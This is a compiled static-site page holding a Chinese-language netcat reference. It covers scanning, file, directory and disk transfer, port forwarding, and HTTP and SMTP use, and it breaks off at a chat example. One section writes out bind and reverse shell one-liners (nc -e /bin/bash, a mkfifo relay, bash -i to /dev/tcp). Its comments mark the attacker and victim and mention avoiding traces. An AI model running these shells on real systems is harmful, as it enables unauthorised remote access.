import{_ as s,o as a,c as n,R as l}from"./chunks/framework.0a8b4614.js";const F=JSON.parse('{"title":"nc(netcat ncat)","description":"","frontmatter":{},"headers":[],"relativePath":"linux/command/nnn/nc.md","filePath":"linux/command/nnn/nc.md","lastUpdated":1655595286000}'),p={name:"linux/command/nnn/nc.md"},o=l(`<h1 id="nc-netcat-ncat" tabindex="-1">nc(netcat ncat) <a class="header-anchor" href="#nc-netcat-ncat" aria-label="Permalink to &quot;nc(netcat ncat)&quot;">​</a></h1><p><a href="https://nmap.org/ncat" target="_blank" rel="noreferrer">https://nmap.org/ncat</a></p><h2 id="install" tabindex="-1">Install <a class="header-anchor" href="#install" aria-label="Permalink to &quot;Install&quot;">​</a></h2><ul><li>rhel</li></ul><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">yum</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">install</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-y</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span></span></code></pre></div><ul><li>debian</li><li>windows</li></ul><h2 id="nc常用参数" tabindex="-1">nc常用参数 <a class="header-anchor" href="#nc常用参数" aria-label="Permalink to &quot;nc常用参数&quot;">​</a></h2><blockquote><p>nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</p></blockquote><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">-g&lt;网关&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">设置路由器跃程通信网关，最多可设置8个。</span></span>
<span class="line"><span style="color:#FFCB6B;">-G&lt;指向器数目&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">设置来源路由指向器，其数值为4的倍数。</span></span>
<span class="line"><span style="color:#FFCB6B;">-h</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">在线帮助。</span></span>
<span class="line"><span style="color:#FFCB6B;">-i&lt;延迟秒数&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">设置时间间隔，以便传送信息及扫描通信端口。</span></span>
<span class="line"><span style="color:#FFCB6B;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">使用监听模式，管控传入的资料。</span></span>
<span class="line"><span style="color:#FFCB6B;">-n</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">直接使用IP地址，而不通过域名服务器。</span></span>
<span class="line"><span style="color:#FFCB6B;">-o&lt;输出文件&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span></span>
<span class="line"><span style="color:#FFCB6B;">-p&lt;通信端口&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">设置本地主机使用的通信端口。</span></span>
<span class="line"><span style="color:#FFCB6B;">-r</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">乱数指定本地与远端主机的通信端口。</span></span>
<span class="line"><span style="color:#FFCB6B;">-s&lt;来源位址&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">设置本地主机送出数据包的IP地址。</span></span>
<span class="line"><span style="color:#FFCB6B;">-u</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">使用UDP传输协议。</span></span>
<span class="line"><span style="color:#FFCB6B;">-v</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">显示指令执行过程。</span></span>
<span class="line"><span style="color:#FFCB6B;">-w&lt;超时秒数&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">设置等待连线的时间。</span></span>
<span class="line"><span style="color:#FFCB6B;">-z</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">使用0输入/输出模式，只在扫描通信端口时使用。</span></span></code></pre></div><h2 id="nc扫描端口连通性" tabindex="-1">nc扫描端口连通性 <a class="header-anchor" href="#nc扫描端口连通性" aria-label="Permalink to &quot;nc扫描端口连通性&quot;">​</a></h2><h3 id="nc端口扫描tcp" tabindex="-1">nc端口扫描TCP <a class="header-anchor" href="#nc端口扫描tcp" aria-label="Permalink to &quot;nc端口扫描TCP&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-nvv</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.0.1</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">80</span><span style="color:#A6ACCD;"> </span><span style="color:#676E95;font-style:italic;"># 扫描 80端口</span></span></code></pre></div><h3 id="nc端口扫描tcp端口范围" tabindex="-1">nc端口扫描TCP端口范围 <a class="header-anchor" href="#nc端口扫描tcp端口范围" aria-label="Permalink to &quot;nc端口扫描TCP端口范围&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-v</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-z</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-w2</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.0.3</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">1</span><span style="color:#C3E88D;">-100</span></span></code></pre></div><h3 id="nc端口扫描udp" tabindex="-1">nc端口扫描UDP <a class="header-anchor" href="#nc端口扫描udp" aria-label="Permalink to &quot;nc端口扫描UDP&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-u</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-z</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-w2</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.0.1</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">1</span><span style="color:#C3E88D;">-1000</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 扫描192.168.0.3 的端口 范围是 1-1000</span></span></code></pre></div><h2 id="nc常用使用场景" tabindex="-1">nc常用使用场景 <a class="header-anchor" href="#nc常用使用场景" aria-label="Permalink to &quot;nc常用使用场景&quot;">​</a></h2><p><mark>建议方式： 在接收端listen监听端口</mark></p><h3 id="nc传输文件" tabindex="-1">nc传输文件 <a class="header-anchor" href="#nc传输文件" aria-label="Permalink to &quot;nc传输文件&quot;">​</a></h3><p>主要利用了系统IO重定向或pipe的功能.</p><p>发送端通过pipe把文件数据传递给stdin，或者通过重定向把stdin重定向到某个文件上，然后接受端只要对stdout进行重定向把它定向到目标文件上去即可。</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">receiver:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">a.txt</span></span>
<span class="line"><span style="color:#FFCB6B;">sender:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">receiver</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">a.txt</span></span></code></pre></div><p>实验：</p><blockquote><p>cp server:a.txt client:b.txt</p></blockquote><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">server:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8089</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">a.txt</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># -p 参数可省略</span></span>
<span class="line"><span style="color:#FFCB6B;">client:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-n</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">serverIP</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8089</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">b.txt</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 需要手工端开</span></span></code></pre></div><blockquote><p>cp client:b.txt server:a.txt</p></blockquote><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">server:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8089</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">a.txt</span><span style="color:#A6ACCD;"> </span><span style="color:#676E95;font-style:italic;"># -p 参数可省略</span></span>
<span class="line"><span style="color:#FFCB6B;">client:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-n</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">serverIP</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8089</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">b.txt</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 传输完成自动断开</span></span></code></pre></div><p>这个功能说成传文件说的有些狭隘了，总之就是传递数据，理论上可以把接收端的数据（可能是某种格式编码的）直接传给对应的处理软件去执行，举个例子比如说看个视频什么的。</p><h3 id="nc传输目录" tabindex="-1">nc传输目录 <a class="header-anchor" href="#nc传输目录" aria-label="Permalink to &quot;nc传输目录&quot;">​</a></h3><blockquote><p>cp sender:/home receiver:/tmp/</p></blockquote><p>压缩格式tar.gz</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">receiver:</span><span style="color:#A6ACCD;">  </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">tar</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">zxf</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-C</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/home</span></span>
<span class="line"><span style="color:#FFCB6B;">sender:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">tar</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">zcf</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/home</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">receiver</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 一定不要忽略横杠-，表示使用内存，不落地</span></span></code></pre></div><p>压缩格式tar.bz2</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">receiver:</span><span style="color:#A6ACCD;">  </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">bzip2</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-d</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">tar</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">zxf</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-</span><span style="color:#A6ACCD;"> </span><span style="color:#676E95;font-style:italic;"># -C /home 解压到某个目录</span></span>
<span class="line"><span style="color:#FFCB6B;">sender:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">tar</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">zcf</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/home</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">bzip2</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-z</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">receiver</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span></span></code></pre></div><h3 id="nc远程克隆硬盘或分区" tabindex="-1">nc远程克隆硬盘或分区 <a class="header-anchor" href="#nc远程克隆硬盘或分区" aria-label="Permalink to &quot;nc远程克隆硬盘或分区&quot;">​</a></h3><p>不能是已经mount的磁盘分区</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">receiver:</span><span style="color:#A6ACCD;">  </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">dd</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">of=/dev/sdb</span></span>
<span class="line"><span style="color:#FFCB6B;">sender:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">dd</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">if=/dev/sdb</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">receiver</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span></span></code></pre></div><h3 id="远程shell-通过nc反向shell" tabindex="-1">远程shell(通过nc反向shell) <a class="header-anchor" href="#远程shell-通过nc反向shell" aria-label="Permalink to &quot;远程shell(通过nc反向shell)&quot;">​</a></h3><p>-e 后面看跟的什么参数了， 比如cmd.exe</p><p>方式1：</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">server:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8089</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-vvvv</span></span>
<span class="line"><span style="color:#FFCB6B;">client:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/bin/bash</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">serverIP</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8089</span></span></code></pre></div><p>方式2：</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">server:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">10000</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-e</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/bin/bash</span></span>
<span class="line"><span style="color:#FFCB6B;">client:</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">serverIP</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">10000</span></span></code></pre></div><p>方式3：</p><p>说明： 从网络收到的输入写到fifo文件中 cat 命令读取fifo文件并且其内容发送给sh命令 sh命令进程受到输入并把它写回到netcat。 netcat 通过网络发送输出到client 至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。 在客户端仅仅简单连接到服务器</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;"># server:</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 创建一个fifo文件</span></span>
<span class="line"><span style="color:#FFCB6B;">mkfifo</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/tmp/tmp_fifo</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中, 是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口9999上。</span></span>
<span class="line"><span style="color:#FFCB6B;">cat</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/tmp/tmp_fifo</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">/bin/bash</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-i</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">2&gt;&amp;1</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/tmp/tmp_fifo</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 9999 &gt; /tmp/tmp_fifo</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># client:</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-n</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">serverIP</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span></span></code></pre></div><h3 id="远程shell-通过bash反向shell" tabindex="-1">远程shell(通过bash反向shell) <a class="header-anchor" href="#远程shell-通过bash反向shell" aria-label="Permalink to &quot;远程shell(通过bash反向shell)&quot;">​</a></h3><p>参考bash</p><p>这种技术是当远程机器上没有netcat或你想做一些非自然的事情而不想留下太重的痕迹时使用。</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;"># 攻击者，本地客户端</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-n</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-vv</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">9999</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 被访问者， 远程服务器</span></span>
<span class="line"><span style="color:#FFCB6B;">bash</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-i</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">/dev/tcp/</span><span style="color:#89DDFF;">&lt;</span><span style="color:#C3E88D;">clientI</span><span style="color:#A6ACCD;">P</span><span style="color:#89DDFF;">&gt;</span><span style="color:#C3E88D;">/9999</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">0</span><span style="color:#89DDFF;">&lt;&amp;</span><span style="color:#FFCB6B;">1</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">2&gt;&amp;1</span></span></code></pre></div><h3 id="nc端口转发" tabindex="-1">nc端口转发 <a class="header-anchor" href="#nc端口转发" aria-label="Permalink to &quot;nc端口转发&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;"># -c 来用 nc 进行端口转发，实现端口转发的语法为：</span></span>
<span class="line"><span style="color:#FFCB6B;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-u</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;">  </span><span style="color:#F78C6C;">80</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-c</span><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">ncat -u -l 8080</span><span style="color:#89DDFF;">&#39;</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 所有连接到 80 端口的连接都会转发到 8080 端口。</span></span></code></pre></div><h3 id="nc使用-w设置客户端超时时间" tabindex="-1">nc使用-w设置客户端超时时间 <a class="header-anchor" href="#nc使用-w设置客户端超时时间" aria-label="Permalink to &quot;nc使用-w设置客户端超时时间&quot;">​</a></h3><p>nc 的监听模式会一直运行，直到手工终止。</p><p>不过我们可以通过选项 -w 设置超时时间:</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-w</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">10</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">192.168</span><span style="color:#C3E88D;">.1.100</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8080</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># 这回导致连接 10 秒后终止，不过这个选项只能用于客户端而不是服务端。</span></span></code></pre></div><h3 id="nc使用-k-选项强制-nc-待命" tabindex="-1">nc使用 -k 选项强制 nc 待命 <a class="header-anchor" href="#nc使用-k-选项强制-nc-待命" aria-label="Permalink to &quot;nc使用 -k 选项强制 nc 待命&quot;">​</a></h3><p>当客户端从服务端断开连接后，过一段时间服务端也会停止监听。 但通过选项 -k 我们可以强制服务器保持连接并继续监听端口。 命令如下：</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">$</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">ncat</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-k</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8080</span></span>
<span class="line"><span style="color:#FFCB6B;">现在即使来自客户端的连接断了也依然会处于待命状态。</span></span></code></pre></div><h3 id="nc指定源端口" tabindex="-1">nc指定源端口 <a class="header-anchor" href="#nc指定源端口" aria-label="Permalink to &quot;nc指定源端口&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">服务器端</span></span>
<span class="line"><span style="color:#A6ACCD;">$nc -l 1567</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FFCB6B;">客户端</span></span>
<span class="line"><span style="color:#A6ACCD;">$nc 172.31.100.7 1567 -p 25</span></span>
<span class="line"><span style="color:#FFCB6B;">使用1024以内的端口需要root权限。</span></span>
<span class="line"><span style="color:#FFCB6B;">该命令将在客户端开启25端口用于通讯，否则将使用随机端口。</span></span></code></pre></div><h3 id="nc发出http请求-并接收server响应-类似curl-待测试" tabindex="-1">nc发出http请求,并接收server响应 (类似curl)待测试 <a class="header-anchor" href="#nc发出http请求-并接收server响应-类似curl-待测试" aria-label="Permalink to &quot;nc发出http请求,并接收server响应 (类似curl)待测试&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#82AAFF;">echo</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-ne</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">GET / HTTP/1.0\\r\\n\\r\\n</span><span style="color:#89DDFF;">&quot;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">www.baidu.com</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">443</span></span>
<span class="line"><span style="color:#82AAFF;">printf</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">GET / HTTP/1.0rnrn</span><span style="color:#89DDFF;">&quot;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">www.baidu.com</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">443</span></span></code></pre></div><h3 id="nc使用smtp发送邮件" tabindex="-1">nc使用SMTP发送邮件 <a class="header-anchor" href="#nc使用smtp发送邮件" aria-label="Permalink to &quot;nc使用SMTP发送邮件&quot;">​</a></h3><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">$</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">smtp_server_ip_address</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">25</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&lt;&lt;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">EOF</span></span>
<span class="line"><span style="color:#C3E88D;">HELO host.example.com</span></span>
<span class="line"><span style="color:#C3E88D;">MAIL FROM:&lt;username@host.example.com&gt;</span></span>
<span class="line"><span style="color:#C3E88D;">RCPT TO:&lt;receiver@host.example.com&gt;</span></span>
<span class="line"><span style="color:#C3E88D;">DATA</span></span>
<span class="line"><span style="color:#C3E88D;">Body of email.</span></span>
<span class="line"><span style="color:#C3E88D;">.</span></span>
<span class="line"><span style="color:#C3E88D;">QUIT</span></span>
<span class="line"><span style="color:#89DDFF;">EOF</span></span></code></pre></div><h3 id="nc聊天" tabindex="-1">nc聊天 <a class="header-anchor" href="#nc聊天" aria-label="Permalink to &quot;nc聊天&quot;">​</a></h3><p>不管你在机器B上键入什么都会出现在机器A上。</p><div class="language-bash"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;"># A:</span></span>
